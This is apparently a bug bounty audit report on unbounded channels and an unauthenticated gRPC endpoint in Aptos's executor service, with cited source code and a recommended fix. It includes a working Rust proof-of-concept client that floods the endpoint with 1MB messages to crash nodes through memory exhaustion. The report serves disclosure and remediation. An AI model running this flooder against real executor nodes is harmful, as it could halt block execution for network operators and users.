# Audit Report

## Title
Unbounded Channel DoS in Executor Service Network Controller Leading to OOM Crashes

## Summary
The `NetworkController` in the executor service uses unbounded crossbeam channels to queue incoming network messages. An attacker can flood the GRPC endpoint with messages faster than they can be processed, causing unbounded memory growth and Out-of-Memory (OOM) crashes of executor service nodes.

## Finding Description

The vulnerability exists in the interaction between three components:

**1. Unbounded Channel Creation**

The `create_outbound_channel` function creates unbounded crossbeam channels without any size limits: [1](#0-0) 

Similarly, `create_inbound_channel` also creates unbounded channels: [2](#0-1) 

**2. Unauthenticated Network Message Ingestion**

The GRPC server endpoint `simple_msg_exchange` accepts messages from any network peer without authentication and immediately sends them to the unbounded channel: [3](#0-2) 

**3. Sequential Message Processing Bottleneck**

The outbound handler processes messages sequentially, one at a time, in a blocking loop: [4](#0-3) 

**Attack Mechanism:**

1. The executor service binds to a network socket address provided via command-line arguments: [5](#0-4) 

2. An attacker connects to this GRPC endpoint and sends messages to `simple_msg_exchange`
3. Each message is queued in an unbounded channel via `handler.send(msg).unwrap()`
4. The sequential processing loop can only handle messages at a limited rate (bounded by network latency for GRPC calls and local processing time)
5. If messages arrive faster than they can be processed, the channel grows without bound
6. Memory consumption increases linearly with the number of queued messages
7. Eventually, the process exhausts available memory and crashes with OOM

**Broken Invariant:**

This violates the critical invariant #9: "Resource Limits: All operations must respect gas, storage, and computational limits." The unbounded channel allows unlimited memory consumption without any resource limit enforcement.

## Impact Explanation

**Severity: CRITICAL**

This meets the Critical severity criteria from the Aptos bug bounty program:

- **"Total loss of liveness/network availability"**: An attacker can crash executor service nodes, causing execution layer failures
- **Production Impact**: The executor service is used for sharded block execution, as evidenced by its usage in the codebase: [6](#0-5) 

If an attacker crashes enough executor shards, the entire sharded execution system becomes unavailable, preventing block execution and halting the blockchain.

**Affected Systems:**
- Executor service nodes running the remote executor
- Sharded block execution infrastructure
- Consensus layer (indirectly, as it depends on execution)

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly likely to succeed because:

1. **No Authentication**: The GRPC endpoint has no authentication checks - any network peer can send messages
2. **Low Complexity**: The attack requires only basic GRPC client capabilities
3. **Minimal Resources**: An attacker needs minimal bandwidth - even slow message rates will accumulate if sustained
4. **No Rate Limiting**: There are no rate limits or throttling mechanisms
5. **Predictable Endpoint**: The socket address is configured and potentially discoverable through network scanning
6. **Guaranteed Effect**: The sequential processing bottleneck ensures messages will accumulate

**Attacker Requirements:**
- Network access to the executor service GRPC endpoint
- Basic GRPC client (can use standard tools like grpcurl or simple Rust/Python client)
- Sustained connection (minutes to hours depending on message size and rate)

## Recommendation

**Immediate Fix**: Replace unbounded channels with bounded channels and implement backpressure:

```rust
pub fn create_outbound_channel(
    &mut self,
    remote_peer_addr: SocketAddr,
    message_type: String,
) -> Sender<Message> {
    // Use bounded channel with reasonable capacity (e.g., 1000 messages)
    const CHANNEL_CAPACITY: usize = 1000;
    let (outbound_sender, outbound_receiver) = bounded(CHANNEL_CAPACITY);

    self.outbound_handler
        .register_handler(message_type, remote_peer_addr, outbound_receiver);

    outbound_sender
}
```

**Additional Security Measures:**

1. **Authentication**: Implement mutual TLS or authentication tokens for GRPC endpoints
2. **Rate Limiting**: Add per-peer rate limiting in the GRPC server
3. **Monitoring**: Add metrics for channel queue depth and alert on high values
4. **Backpressure**: When channels are full, reject new messages with appropriate GRPC error codes
5. **Message Size Limits**: While `MAX_MESSAGE_SIZE` exists, ensure it's enforced consistently
6. **Network Isolation**: Document that executor service endpoints should be on isolated networks, not publicly accessible

## Proof of Concept

```rust
// PoC: Flood the executor service GRPC endpoint
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use tonic::transport::Channel;
use std::time::Duration;

#[tokio::main]
async fn main() {
    // Connect to target executor service
    let target = "http://127.0.0.1:50051"; // Replace with actual address
    let mut client = NetworkMessageServiceClient::connect(target)
        .await
        .expect("Failed to connect");

    println!("Starting DoS attack...");
    
    // Flood with messages
    let mut counter = 0;
    loop {
        let message = NetworkMessage {
            message: vec![0u8; 1024 * 1024], // 1MB message
            message_type: "attack".to_string(),
        };
        
        match client.simple_msg_exchange(message).await {
            Ok(_) => {
                counter += 1;
                if counter % 100 == 0 {
                    println!("Sent {} messages", counter);
                }
            }
            Err(e) => {
                println!("Error (node may have crashed): {}", e);
                break;
            }
        }
        
        // Small delay to avoid overwhelming local network stack
        tokio::time::sleep(Duration::from_millis(1)).await;
    }
}
```

**Expected Result**: After flooding for several minutes (depending on available memory), the target executor service will crash with an OOM error as the unbounded channel consumes all available memory.

**Validation**: Monitor the target process memory usage - it should grow continuously and linearly until the process terminates.

## Notes

This vulnerability is distinct from generic network-level DoS attacks because it exploits a specific application design flaw (unbounded channels) rather than overwhelming network capacity. The root cause is the absence of resource limits in the channel implementation, which violates Aptos's resource limit invariants.

### Citations

**File:** secure/net/src/network_controller/mod.rs (L115-126)
```rust
    pub fn create_outbound_channel(
        &mut self,
        remote_peer_addr: SocketAddr,
        message_type: String,
    ) -> Sender<Message> {
        let (outbound_sender, outbound_receiver) = unbounded();

        self.outbound_handler
            .register_handler(message_type, remote_peer_addr, outbound_receiver);

        outbound_sender
    }
```

**File:** secure/net/src/network_controller/mod.rs (L128-137)
```rust
    pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
        let (inbound_sender, inbound_receiver) = unbounded();

        self.inbound_handler
            .lock()
            .unwrap()
            .register_handler(message_type, inbound_sender);

        inbound_receiver
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** secure/net/src/network_controller/outbound_handler.rs (L103-161)
```rust
    async fn process_one_outgoing_message(
        outbound_handlers: Vec<(Receiver<Message>, SocketAddr, MessageType)>,
        socket_addr: &SocketAddr,
        inbound_handler: Arc<Mutex<InboundHandler>>,
        grpc_clients: &mut HashMap<SocketAddr, GRPCNetworkMessageServiceClientWrapper>,
    ) {
        loop {
            let mut select = Select::new();
            for (receiver, _, _) in outbound_handlers.iter() {
                select.recv(receiver);
            }

            let index;
            let msg;
            let _timer;
            {
                let oper = select.select();
                _timer = NETWORK_HANDLER_TIMER
                    .with_label_values(&[&socket_addr.to_string(), "outbound_msgs"])
                    .start_timer();
                index = oper.index();
                match oper.recv(&outbound_handlers[index].0) {
                    Ok(m) => {
                        msg = m;
                    },
                    Err(e) => {
                        warn!(
                            "{:?} for outbound handler on {:?}. This can happen in shutdown,\
                             but should not happen otherwise",
                            e.to_string(),
                            socket_addr
                        );
                        return;
                    },
                }
            }

            let remote_addr = &outbound_handlers[index].1;
            let message_type = &outbound_handlers[index].2;

            if message_type.get_type() == "stop_task" {
                return;
            }

            if remote_addr == socket_addr {
                // If the remote address is the same as the local address, then we are sending a message to ourselves
                // so we should just pass it to the inbound handler
                inbound_handler
                    .lock()
                    .unwrap()
                    .send_incoming_message_to_handler(message_type, msg);
            } else {
                grpc_clients
                    .get_mut(remote_addr)
                    .unwrap()
                    .send_message(*socket_addr, msg, message_type)
                    .await;
            }
        }
```

**File:** execution/executor-service/src/main.rs (L27-48)
```rust
fn main() {
    let args = Args::parse();
    aptos_logger::Logger::new().init();

    let (tx, rx) = crossbeam_channel::unbounded();
    ctrlc::set_handler(move || {
        tx.send(()).unwrap();
    })
    .expect("Error setting Ctrl-C handler");

    let _exe_service = ProcessExecutorService::new(
        args.shard_id,
        args.num_shards,
        args.num_executor_threads,
        args.coordinator_address,
        args.remote_executor_addresses,
    );

    rx.recv()
        .expect("Could not receive Ctrl-C msg from channel.");
    info!("Process executor service shutdown successfully.");
}
```

**File:** execution/executor-service/src/remote_executor_service.rs (L13-19)
```rust
/// A service that provides support for remote execution. Essentially, it reads a request from
/// the remote executor client and executes the block locally and returns the result.
pub struct ExecutorService {
    shard_id: ShardId,
    controller: NetworkController,
    executor_service: Arc<ShardedExecutorService<RemoteStateViewClient>>,
}
```
